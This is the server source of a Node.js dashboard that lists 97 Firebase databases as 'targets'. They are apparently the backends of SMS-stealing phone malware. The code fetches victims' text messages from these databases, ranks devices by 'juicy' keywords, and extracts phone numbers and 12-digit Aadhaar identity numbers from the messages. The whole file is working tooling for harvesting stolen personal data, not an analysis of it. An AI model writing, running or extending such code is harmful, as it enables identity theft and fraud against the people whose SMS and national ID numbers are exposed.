import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const app = express();
const PORT = 3000;

// ── Path to bot's working directory (where devices_database_*.json live) ──────
const BOT_DIR = process.env.BOT_DIR || '/home/ubuntu/newp';

// ── RAW_TARGETS from DA1.py ───────────────────────────────────────────────────
const RAW_TARGETS = [
  [1,'https://aartihh-dffe3-default-rtdb.firebaseio.com'],
  [2,'https://hsm2pro21-default-rtdb.firebaseio.com'],
  [3,'https://hvgvgv-abcf9-default-rtdb.firebaseio.com'],
  [4,'https://iphone-11-baab-default-rtdb.firebaseio.com/clients'],
  [5,'https://jamtar7-95f77-default-rtdb.firebaseio.com'],
  [6,'https://kubgkhbm-default-rtdb.firebaseio.com'],
  [7,'https://loda-5029e-default-rtdb.firebaseio.com/clients'],
  [8,'https://lovefimus-default-rtdb.firebaseio.com'],
  [9,'https://naxus-89796-default-rtdb.firebaseio.com'],
  [10,'https://rahul-e20c4-default-rtdb.firebaseio.com'],
  [11,'https://rahulkumat0651-87bc2-default-rtdb.firebaseio.com'],
  [12,'https://sbinew-bbc00-default-rtdb.firebaseio.com'],
  [13,'https://tillu-2-default-rtdb.firebaseio.com'],
  [14,'https://adityapanel-default-rtdb.firebaseio.com'],
  [15,'https://allinone-cf029-default-rtdb.firebaseio.com'],
  [16,'https://axis-c4bd3-default-rtdb.firebaseio.com'],
  [17,'https://backup-ec5d6-default-rtdb.firebaseio.com'],
  [18,'https://billojii-default-rtdb.firebaseio.com'],
  [19,'https://e22turnament2-default-rtdb.firebaseio.com'],
  [20,'https://fir-6b48f-default-rtdb.firebaseio.com'],
  [21,'https://h2buwhge-default-rtdb.firebaseio.com'],
  [22,'https://hello-6153b-default-rtdb.firebaseio.com'],
  [23,'https://iphone-11-baab-default-rtdb.firebaseio.com'],
  [24,'https://loda-5029e-default-rtdb.firebaseio.com'],
  [25,'https://newtan3450-default-rtdb.firebaseio.com'],
  [26,'https://noob-f1798-default-rtdb.firebaseio.com'],
  [27,'https://okayo-f1a54-default-rtdb.firebaseio.com'],
  [28,'https://proffercelawte-default-rtdb.firebaseio.com'],
  [29,'https://projectname-15100-default-rtdb.firebaseio.com'],
  [30,'https://adminpanel-5f533-default-rtdb.firebaseio.com'],
  [31,'https://admon-aeba0-default-rtdb.firebaseio.com'],
  [32,'https://challan5-default-rtdb.firebaseio.com'],
  [33,'https://human-34-kumar-default-rtdb.firebaseio.com'],
  [34,'https://mp-24jfg-default-rtdb.firebaseio.com'],
  [35,'https://nky0-a5870-default-rtdb.firebaseio.com'],
  [36,'https://nonono-q-default-rtdb.firebaseio.com'],
  [37,'https://u72328193-47b68-default-rtdb.firebaseio.com'],
  [38,'https://ai-rto-9-default-rtdb.firebaseio.com'],
  [39,'https://u72749819-fa563-default-rtdb.firebaseio.com'],
  [40,'https://ajay-33c1b-default-rtdb.firebaseio.com'],
  [41,'https://anaryef50-aa5f1-default-rtdb.firebaseio.com'],
  [42,'https://ajna-20fc4-default-rtdb.firebaseio.com'],
  [43,'https://e5turnament2-default-rtdb.firebaseio.com'],
  [44,'https://jaimahakal-42698-default-rtdb.firebaseio.com'],
  [45,'https://motb-10aae-default-rtdb.firebaseio.com'],
  [46,'https://bevhhwhbe-default-rtdb.firebaseio.com'],
  [47,'https://business-apps-ba1-f86b7-default-rtdb.firebaseio.com'],
  [48,'https://csforme-dc64a-default-rtdb.firebaseio.com'],
  [49,'https://dogla-de225-default-rtdb.firebaseio.com'],
  [50,'https://gren-ff2af-default-rtdb.firebaseio.com'],
  [51,'https://sep12-aea6d-default-rtdb.firebaseio.com'],
  [52,'https://tt01-5e373-default-rtdb.firebaseio.com'],
  [53,'https://hjmi-5af19-default-rtdb.firebaseio.com'],
  [54,'https://jjjjjkkk-d0cc0-default-rtdb.firebaseio.com'],
  [55,'https://lalu-rama50-default-rtdb.firebaseio.com'],
  [56,'https://u24143844-c1b11-default-rtdb.firebaseio.com'],
  [57,'https://mypr-6123d-default-rtdb.firebaseio.com'],
  [58,'https://nxt11-d55d0-default-rtdb.firebaseio.com'],
  [59,'https://r62710898-39a8e-default-rtdb.firebaseio.com'],
  [60,'https://u16714964-283ef-default-rtdb.firebaseio.com'],
  [61,'https://u40179853-987df-default-rtdb.firebaseio.com'],
  [62,'https://u58325342-dffc0-default-rtdb.firebaseio.com'],
  [63,'https://u62803313-e54bc-default-rtdb.firebaseio.com'],
  [64,'https://u67583339-bf0c1-default-rtdb.firebaseio.com'],
  [65,'https://u75887828-b5a63-default-rtdb.firebaseio.com'],
  [66,'https://rahu80759-ac69b-default-rtdb.firebaseio.com'],
  [67,'https://raja252525raj-4ee9a-default-rtdb.firebaseio.com'],
  [68,'https://salasali6990-1171d-default-rtdb.firebaseio.com'],
  [69,'https://testing-81627-default-rtdb.firebaseio.com'],
  [70,'https://ranjibses-default-rtdb.firebaseio.com'],
  [71,'https://risho-d4c66-default-rtdb.firebaseio.com'],
  [72,'https://sanj-683c4-default-rtdb.firebaseio.com'],
  [73,'https://testuuu-f5cbb-default-rtdb.firebaseio.com'],
  [74,'https://u13667713-dc566-default-rtdb.firebaseio.com'],
  [75,'https://u24153206-5eef6-default-rtdb.firebaseio.com'],
  [76,'https://u25428732-91bd9-default-rtdb.firebaseio.com'],
  [77,'https://u25783858-e6739-default-rtdb.firebaseio.com'],
  [78,'https://u62751482-f5b46-default-rtdb.firebaseio.com'],
  [79,'https://u8208372-ad1d1-default-rtdb.firebaseio.com'],
  // New URLs (80-97) — schema verified live
  [80,'https://tinmm88-b7db5-default-rtdb.firebaseio.com'],
  [81,'https://e9turnament1-default-rtdb.firebaseio.com'],
  [82,'https://raaz-5287d-default-rtdb.firebaseio.com'],
  [83,'https://apkpure-6eb6a-default-rtdb.firebaseio.com'],
  [84,'https://e14turnament2-default-rtdb.firebaseio.com'],
  [85,'https://bossuun-default-rtdb.firebaseio.com'],
  [86,'https://jsjsjdj-7f0d1-default-rtdb.firebaseio.com'],
  [87,'https://rahul-54fe9-default-rtdb.firebaseio.com'],
  [88,'https://runjun-master-panel-default-rtdb.firebaseio.com'],
  [89,'https://apkdriod-f6fb9-default-rtdb.firebaseio.com'],
  [90,'https://fir-1fa16-default-rtdb.firebaseio.com'],
  [91,'https://newspreding-default-rtdb.firebaseio.com'],
  [92,'https://privatesok-59944-default-rtdb.firebaseio.com'],
  [93,'https://fir-27c9e-default-rtdb.firebaseio.com'],
  [94,'https://singhaana-6f199-default-rtdb.firebaseio.com'],
  [95,'https://vibe-d238e-default-rtdb.firebaseio.com'],
  [96,'https://painislv-default-rtdb.firebaseio.com'],
  [97,'https://rahais-default-rtdb.firebaseio.com'],
];

// ── Schema assignment (mirrors DA1.py MultiTargetManager) ─────────────────────
const SCHEMA_2  = new Set([14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,46,71,73,
                            81,83,90,92,94,97]);
const SCHEMA_3  = new Set([31,32,33,34,35,36,37,55,56,66,67,68,69,72,77,79]);
const SCHEMA_4  = new Set([42,43,44,45,49,50,51,52]);
const SCHEMA_5  = new Set([58]);
const SCHEMA_6  = new Set([57]);
const SCHEMA_8A = new Set([1]);
const SCHEMA_8B = new Set([3,8,9,10,11,41]);
const SCHEMA_9  = new Set([5,12,13,40,54,59,61,62,63,64,65,70,74,75,76,93]);
const SCHEMA_10 = new Set([4,84]);
const SCHEMA_11 = new Set([7,80,82,85,86,87,88,89,91,95,96]);
const SCHEMA_12 = new Set([48]);
const SCHEMA_13 = new Set([53]);
const SCHEMA_14 = new Set([39,78]);
const SCHEMA_15 = new Set([38]);

function getSchema(id) {
  if (SCHEMA_8A.has(id)) return '8a';
  if (SCHEMA_8B.has(id)) return '8b';
  if (SCHEMA_9.has(id))  return 9;
  if (SCHEMA_10.has(id)) return 10;
  if (SCHEMA_11.has(id)) return 11;
  if (SCHEMA_12.has(id)) return 12;
  if (SCHEMA_13.has(id)) return 13;
  if (SCHEMA_14.has(id)) return 14;
  if (SCHEMA_15.has(id)) return 15;
  if (SCHEMA_2.has(id))  return 2;
  if (SCHEMA_3.has(id))  return 3;
  if (SCHEMA_4.has(id))  return 4;
  if (SCHEMA_5.has(id))  return 5;
  if (SCHEMA_6.has(id))  return 6;
  return 1;
}

// Build target list
const TARGETS = RAW_TARGETS.map(([id, url]) => ({
  id, url: url.replace(/\/$/, ''), schema: getSchema(id)
}));

// ── Helpers ───────────────────────────────────────────────────────────────────
function extract10Digits(raw) {
  if (!raw || ['N/A','Unknown','None','','null'].includes(String(raw).trim())) return '';
  const digits = String(raw).replace(/\D/g, '');
  return digits.length >= 10 ? digits.slice(-10) : '';
}

function getSmsLink(target, deviceId, objId) {
  const { url, schema } = target;
  const did = deviceId;
  if (schema === 1)    return `${url}/All_Users/sms/${did}.json?print=pretty`;
  if ([2,4,5,15,10,11].includes(schema)) return `${url}/messages/${did}.json?print=pretty`;
  if (schema === '8a' || schema === '8b') {
    const actual = (objId && objId !== 'N/A') ? objId : did;
    return `${url}/omex/All_User/Sms/${actual}.json?print=pretty`;
  }
  if ([3,6,9,14].includes(schema)) return `${url}/user_sms/${did}.json?print=pretty`;
  if (schema === 12)   return `${url}/profex_incoming/${did}.json?print=pretty`;
  if (schema === 13)   return `${url}/admin.json?print=pretty`;
  return `${url}/user_sms/${did}.json?print=pretty`;
}

// ── Aadhar DB: loaded once, refreshed on each /api/url/:id call ──────────────
const AADHAR_FILE = path.join(BOT_DIR, 'aadhar.json');
function loadAadharDb() {
  try {
    if (fs.existsSync(AADHAR_FILE)) return JSON.parse(fs.readFileSync(AADHAR_FILE, 'utf8'));
  } catch {}
  return {};
}

function loadDb(targetId) {
  const file = path.join(BOT_DIR, `devices_database_${targetId}.json`);
  try {
    if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf8'));
  } catch {}
  return {};
}

function parseLastActivity(actStr) {
  // "2026-06-14 10:08" → Date
  if (!actStr || actStr === 'Unknown') return null;
  try { return new Date(actStr); } catch { return null; }
}

function summariseTarget(target) {
  const devices = loadDb(target.id);
  const deviceList = Object.entries(devices);
  const total = deviceList.length;
  let online = 0, juicyCount = 0, withSim1 = 0, withSim2 = 0;
  let oldestActivity = null, newestActivity = null;

  for (const [, dev] of deviceList) {
    if (dev.current_status === 'online') online++;
    if ((dev.juicy_keywords || []).length > 0) juicyCount++;
    if (extract10Digits(dev.sim1_number)) withSim1++;
    if (extract10Digits(dev.sim2_number)) withSim2++;
    const act = parseLastActivity(dev.last_activity);
    if (act) {
      if (!oldestActivity || act < oldestActivity) oldestActivity = act;
      if (!newestActivity || act > newestActivity) newestActivity = act;
    }
  }

  return {
    id: target.id,
    url: target.url,
    schema: target.schema,
    total,
    online,
    offline: total - online,
    juicyCount,
    withSim1,
    withSim2,
    oldestSms: oldestActivity ? oldestActivity.toISOString().slice(0,10) : null,
    newestSms: newestActivity ? newestActivity.toISOString().slice(0,10) : null,
  };
}

// ── API routes ────────────────────────────────────────────────────────────────
app.get('/api/urls', (req, res) => {
  const summaries = TARGETS.map(t => summariseTarget(t));
  res.json(summaries);
});

app.get('/api/url/:id', (req, res) => {
  const id = parseInt(req.params.id);
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });

  const devices = loadDb(id);
  const aadharDb = loadAadharDb();
  const aadharForUrl = aadharDb[String(id)] || {};

  const deviceList = Object.entries(devices)
    .map(([deviceId, dev]) => ({
      deviceId,
      brand:         dev.brand || 'Unknown',
      status:        dev.current_status || 'offline',
      battery:       dev.last_battery || 'N/A',
      lastActivity:  dev.last_activity || null,
      smsDate:       dev.last_activity || null,
      lastOnline:    dev.last_online || null,
      sim1:          dev.sim1_number || 'N/A',
      sim2:          dev.sim2_number || 'N/A',
      sim1Clean:     extract10Digits(dev.sim1_number),
      sim2Clean:     extract10Digits(dev.sim2_number),
      juicyKeywords: dev.juicy_keywords || [],
      appId:         dev.app_id || 'N/A',
      objId:         dev.obj_id || 'N/A',
      userSerial:    dev.user_serial || 'N/A',
      sim1Enriched:  dev.sim1_enriched || [],
      sim2Enriched:  dev.sim2_enriched || [],
      smsLink:       getSmsLink(target, deviceId, dev.obj_id),
      hasAadhaar:    !!(aadharForUrl[deviceId] && aadharForUrl[deviceId].length > 0),
      aadhaarNums:   aadharForUrl[deviceId] || [],
    }))
    .sort((a, b) => {
      // online first, then juicy, then by lastActivity desc
      if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
      if (b.juicyKeywords.length !== a.juicyKeywords.length)
        return b.juicyKeywords.length - a.juicyKeywords.length;
      return 0;
    });

  res.json({ id, url: target.url, schema: target.schema, devices: deviceList });
});

// ── SearchNo: fetch device SMS from Firebase, return messages with Indian phone numbers ──
app.get('/api/url/:id/device/:deviceId/searchno', async (req, res) => {
  const id = parseInt(req.params.id);
  const deviceId = req.params.deviceId;
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'URL not found' });

  const db = loadDb(id);
  const dev = db[deviceId];
  if (!dev) return res.status(404).json({ error: 'Device not found in cache' });

  const objId = dev.obj_id || 'N/A';
  const fetchUrl = getSmsLink(target, deviceId, objId).replace('?print=pretty', '');

  try {
    const resp = await fetch(fetchUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0' },
      signal: AbortSignal.timeout(15000),
    });
    if (!resp.ok) {
      return res.json({ hits: [], total: 0, error: `HTTP ${resp.status}` });
    }
    const smsData = await resp.json();

    // Indian mobile: 10 digits starting 6-9, optionally prefixed with +91 or 91
    const PHONE_RE = /(?<!\d)(?:\+91|91)?([6-9]\d{9})(?!\d)/g;
    const MISSED_CALL_RE = /missed\s+call(s)?\s+(from|to)/i;
    const AVAILABLE_RE = /is\s+now\s+available|available\s+to\s+(take|receive|answer)/i;

    function* iterMsgs(data) {
      if (typeof data !== 'object' || !data) return;
      for (const v of Object.values(data)) {
        if (typeof v !== 'object' || !v) continue;
        const hasBody = 'body' in v || 'message' in v || 'msg' in v || 'text' in v;
        if (hasBody) { yield v; }
        else { yield* iterMsgs(v); }
      }
    }

    const hits = [];
    for (const msg of iterMsgs(smsData)) {
      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
      if (!body) continue;
      if (MISSED_CALL_RE.test(body) || AVAILABLE_RE.test(body)) continue;
      const phones = [...new Set([...body.matchAll(PHONE_RE)].map(m => m[1]))];
      if (phones.length) hits.push({ body, phones });
      if (hits.length >= 100) break; // cap at 100
    }

    res.json({ hits, total: hits.length });
  } catch (e) {
    res.json({ hits: [], total: 0, error: e.message });
  }
});

// ── SearchAadhar: fetch device SMS, return messages containing 12-digit Aadhaar numbers ──
app.get('/api/url/:id/device/:deviceId/searchaadhar', async (req, res) => {
  const id = parseInt(req.params.id);
  const deviceId = req.params.deviceId;
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'URL not found' });

  const db = loadDb(id);
  const dev = db[deviceId];
  if (!dev) return res.status(404).json({ error: 'Device not found in cache' });

  const objId = dev.obj_id || 'N/A';
  const fetchUrl = getSmsLink(target, deviceId, objId).replace('?print=pretty', '');

  try {
    const resp = await fetch(fetchUrl, {
      headers: { 'User-Agent': 'Mozilla/5.0' },
      signal: AbortSignal.timeout(15000),
    });
    if (!resp.ok) return res.json({ hits: [], total: 0, error: `HTTP ${resp.status}` });
    const smsData = await resp.json();

    // 12-digit Aadhaar: must not be preceded/followed by another digit
    const AADHAR_RE = /(?<!\d)([2-9]\d{11})(?!\d)/g;
    const AADHAR_KW = /aadhaar|aadhar/i;

    function* iterMsgs(data) {
      if (typeof data !== 'object' || !data) return;
      for (const v of Object.values(data)) {
        if (typeof v !== 'object' || !v) continue;
        const hasBody = 'body' in v || 'message' in v || 'msg' in v || 'text' in v;
        if (hasBody) { yield v; }
        else { yield* iterMsgs(v); }
      }
    }

    const hits = [];
    for (const msg of iterMsgs(smsData)) {
      const body = String(msg.body || msg.message || msg.msg || msg.text || '');
      if (!body) continue;
      const aadhars = [...new Set([...body.matchAll(AADHAR_RE)].map(m => m[1]))];
      const hasKeyword = AADHAR_KW.test(body);
      // Include ONLY if BOTH: has 12-digit number AND contains "aadhaar" keyword
      if (aadhars.length && hasKeyword) {
        hits.push({ body, aadhars, hasKeyword });
      }
      if (hits.length >= 100) break;
    }

    res.json({ hits, total: hits.length });
  } catch (e) {
    res.json({ hits: [], total: 0, error: e.message });
  }
});

// ── Live fetch: get devices directly from Firebase (bypasses cached DB) ───────
app.get('/api/url/:id/live', async (req, res) => {
  const id = parseInt(req.params.id);
  const target = TARGETS.find(t => t.id === id);
  if (!target) return res.status(404).json({ error: 'Not found' });

  const { url, schema } = target;

  // Determine main endpoint per schema (mirrors DA1.py logic)
  let mainEndpoint;
  if (schema === 1)                           mainEndpoint = `${url}/All_Users.json`;
  else if (schema === 2 || schema === 4)      mainEndpoint = `${url}/clients.json`;
  else if (schema === 3)                      mainEndpoint = `${url}/user_data.json`;
  else if (schema === 5)                      mainEndpoint = `${url}/devices.json`;
  else if (schema === 6)                      mainEndpoint = `${url}/data.json`;
  else if (schema === '8a')                   mainEndpoint = `${url}/omex.json`;
  else if (['8b',9,10,11,14,15].includes(schema)) mainEndpoint = `${url}/.json`;
  else if (schema === 12)                     mainEndpoint = `${url}/devices.json`;
  else if (schema === 13)                     mainEndpoint = `${url}/admin.json`;
  else                                        mainEndpoint = `${url}/All_Users.json`;

  try {
    const resp = await fetch(mainEndpoint, {
      headers: { 'User-Agent': 'Mozilla/5.0' },
      signal: AbortSignal.timeout(20000),
    });
    if (!resp.ok) return res.json({ error: `Firebase HTTP ${resp.status}`, devices: [] });
    const data = await resp.json();

    // Extract device list per schema
    let rawDevs = {};
    if (schema === 1) {
      rawDevs = (data?.Data?.DeviceInfo) || {};
    } else if (schema === '8a') {
      rawDevs = data?.All_User?.Info || {};
    } else if (schema === '8b') {
      rawDevs = data?.omex?.All_User?.Info || {};
    } else if (schema === 9) {
      rawDevs = data?.user_data || {};
    } else if (schema === 10 || schema === 11) {
      rawDevs = data?.clients || {};
    } else if (schema === 12) {
      rawDevs = data || {};
    } else if (schema === 13) {
      // flatten admin[X].users
      if (data && typeof data === 'object') {
        for (const av of Object.values(data)) {
          if (av && typeof av === 'object' && av.users) {
            for (const [uid, udat] of Object.entries(av.users)) {
              if (udat && typeof udat === 'object') rawDevs[uid] = udat;
            }
          }
        }
      }
    } else if (schema === 14) {
      const ud = data?.user_data || {};
      const cl = data?.clients || {};
      for (const [k,v] of Object.entries(ud)) if (v && typeof v==='object') rawDevs[k] = v;
      for (const [k,v] of Object.entries(cl)) if (!rawDevs[k] && v && typeof v==='object') rawDevs[k] = v;
    } else if (schema === 15) {
      const users = data?.users || {};
      for (const [,udat] of Object.entries(users)) {
        if (udat?.DeviceId) rawDevs[udat.DeviceId] = udat;
      }
    } else {
      rawDevs = (data && typeof data === 'object') ? data : {};
    }

    // Build simplified device list from live data
    const now = Date.now();
    const devices = Object.entries(rawDevs)
      .filter(([, d]) => d && typeof d === 'object')
      .map(([deviceId, d]) => {
        // Determine online status
        let isOnline = false;
        if (schema === 1)       isOnline = d.Status === 'Online';
        else if (schema === '8a' || schema === '8b') isOnline = d.status === 'Online';
        else if (schema === 9)  isOnline = d.status === 'online';
        else if (schema === 15) isOnline = d.Status === 'Online';
        else                    isOnline = d.status === true || d.status === 'online' || d.status === 'Online';

        // Brand
        let brand = d.Brand || d.Name || d.brand || d.modelName || d.d_name || d.DeviceId || 'Unknown';

        // Battery
        let battery = d.Battery || d.battery || 'N/A';

        return { deviceId, brand: String(brand), status: isOnline ? 'online' : 'offline', battery: String(battery) };
      })
      .sort((a, b) => (a.status === 'online' ? -1 : 1) - (b.status === 'online' ? -1 : 1));

    res.json({ id, total: devices.length, online: devices.filter(d=>d.status==='online').length, devices });
  } catch (e) {
    res.json({ error: e.message, devices: [] });
  }
});

// ── Global device search across all URLs ─────────────────────────────────────
app.get('/api/search/device/:deviceId', (req, res) => {
  const q = req.params.deviceId.toLowerCase().trim();
  const results = [];
  for (const target of TARGETS) {
    const db = loadDb(target.id);
    for (const [deviceId, dev] of Object.entries(db)) {
      if (deviceId.toLowerCase().includes(q)) {
        results.push({
          urlId:      target.id,
          url:        target.url,
          schema:     target.schema,
          deviceId,
          brand:      dev.brand || 'Unknown',
          status:     dev.current_status || 'offline',
          battery:    dev.last_battery || 'N/A',
          sim1:       dev.sim1_number || 'N/A',
          sim2:       dev.sim2_number || 'N/A',
          lastActivity: dev.last_activity || null,
          juicyKeywords: dev.juicy_keywords || [],
          smsLink:    getSmsLink(target, deviceId, dev.obj_id),
        });
      }
    }
  }
  res.json({ results, total: results.length });
});

// ── Device Notes: save/load text notes per device (stored in notes.json) ──────
const NOTES_FILE = path.join(BOT_DIR, 'device_notes.json');

function loadNotes() {
  try { if (fs.existsSync(NOTES_FILE)) return JSON.parse(fs.readFileSync(NOTES_FILE, 'utf8')); }
  catch {}
  return {};
}
function saveNotes(notes) {
  try { fs.writeFileSync(NOTES_FILE, JSON.stringify(notes, null, 2)); }
  catch (e) { console.error('Notes save error:', e.message); }
}

app.get('/api/notes/:urlId/:deviceId', (req, res) => {
  const key = `${req.params.urlId}:${req.params.deviceId}`;
  const notes = loadNotes();
  res.json({ note: notes[key] || '' });
});

app.post('/api/notes/:urlId/:deviceId', express.json(), (req, res) => {
  const key = `${req.params.urlId}:${req.params.deviceId}`;
  const notes = loadNotes();
  notes[key] = req.body.note || '';
  saveNotes(notes);
  res.json({ ok: true });
});

// ── Serve frontend ────────────────────────────────────────────────────────────
app.use(express.static(path.join(__dirname, 'public')));
app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.listen(PORT, () => {
  console.log(`Device Monitor Dashboard running at http://localhost:${PORT}`);
  console.log(`Reading DB files from: ${BOT_DIR}`);
});
